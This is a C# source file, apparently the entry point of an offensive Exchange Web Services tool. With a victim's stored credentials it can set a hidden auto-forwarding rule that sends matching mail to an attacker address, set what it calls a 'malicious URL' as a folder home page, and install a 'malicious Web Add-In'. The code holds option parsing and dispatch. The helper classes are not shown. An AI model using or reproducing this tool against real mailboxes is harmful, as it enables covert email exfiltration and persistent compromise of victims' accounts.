using System;
using System.Collections.Generic;
using NDesk.Options;
using Microsoft.Exchange.WebServices.Data;
using System.Linq;

namespace EWS
{
    public class Program
    {

        private static List<string> CreateList(string strings)
        {
            List<string> List = new List<string>();

            string[] str = strings.Split(',');
            foreach(string s in str)
            {
                List.Add(s);
            }

            return List;

        }

        public static void Main(string[] args)
        {
            // global
            string email = null;
            string password = null;
            bool help = false;

            // rules
            bool rule = false;
            string ruleName = null;
            List<string> subjectStrings = new List<string>();
            List<string> bodyStrings = new List<string>();
            string forwardAddress = null;

            // home folder
            bool homefolder = false;
            string url = null;

            // installapp
            bool installapp = false;
            string manifest = null;

            var options = new OptionSet()
            {
                { "e|email=", "Email address to authenticate with", v => email = v },
                { "p|password=", "Password to authenticate with", v => password = v },
                { "rule", "Set auto-forwarding rules on users' mailbox", v => rule = true },
                { "n|name=", "Set a name for the rule", v => ruleName = v },
                { "s|subject=", "Trigger on these strings in the mail Subject", v => subjectStrings = CreateList(v) },
                { "b|body=", "Trigger on these strings in the mail Body", v => bodyStrings = CreateList(v) },
                { "f|forward=", "Email address to receive forwarded emails at", v => forwardAddress = v },
                { "homefolder", "Set a malicious URL on a folder", v => homefolder = true },
                { "u|url=", "URL to configure", v => url = v },
                { "installapp", "Install a malicious Web Add-In", v => installapp = true },
                { "m|manifest=", "Manifest to install", v => manifest = v },
                { "h|?|help", "Show this help", v => help = true }
            };

            try
            {
                options.Parse(args);
            }
            catch (OptionException ex)
            {
                Console.WriteLine(ex);
            }

            Logo.Print();

            if (args.Length == 0 || help)
            {
                Console.WriteLine();
                Console.WriteLine("  Options:");
                options.WriteOptionDescriptions(Console.Out);
                Console.WriteLine();
                Help.ShowExamples();
                return;
            }

            if (rule)
            {
                if (ruleName == null)
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] Name required");
                    return;
                }

                if (!subjectStrings.Any() && !bodyStrings.Any())
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] Subject or Body strings required");
                    return;
                }

                if (forwardAddress == null)
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] Forward address required");
                    return;
                }

                ExchangeService service = Exchange.NewExchangeService(email, password);
                Rules.AddNewRule(service, ruleName, subjectStrings, bodyStrings, forwardAddress);

            }

            if (homefolder)
            {
                if (url == null)
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] URL required");
                    return;
                }

                try
                {
                    ExchangeService service = Exchange.NewExchangeService(email, password);
                    HomeFolder.AddHomeFolderURL(service, url);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }

            if (installapp)
            {
                Console.WriteLine();
                Console.WriteLine(" [>] Installing Application Manifest");

                if (manifest == null)
                {
                    Console.WriteLine(" [x] Manifest Required");
                    return;
                }

                try
                {
                    ExchangeService service = Exchange.NewExchangeService(email, password);
                    InstallApp.InstallNewApp(service, manifest);                    
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }

        }
    }
}